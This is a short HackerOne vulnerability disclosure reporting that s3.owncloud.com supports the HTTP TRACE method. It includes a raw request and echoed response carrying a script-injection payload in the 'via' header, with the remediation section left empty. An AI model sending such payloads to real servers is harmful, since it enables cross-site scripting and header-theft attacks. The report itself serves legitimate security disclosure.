# HackerOne Report: [s3.owncloud.com] Web Server HTTP Trace/Track Method Support 
**Report ID:** 90601
**Vulnerability Class:** Violation of Secure Design Principles

## Vulnerability Information & PoC
Hello. 
Not ineresting bug but you can fixed it as in #83837. (https://hackerone.com/reports/83837)

Request:
TRACE /gxDM8DATHA HTTP/1.1
Host: s3.owncloud.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
via: <script>alert('QualysXSS');</script>

Response:
TRACE /gxDM8DATHA HTTP/1.1
Host: s3.owncloud.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
via: <script>alert('QualysXSS');</script>



## Discussion & Remediation Timeline
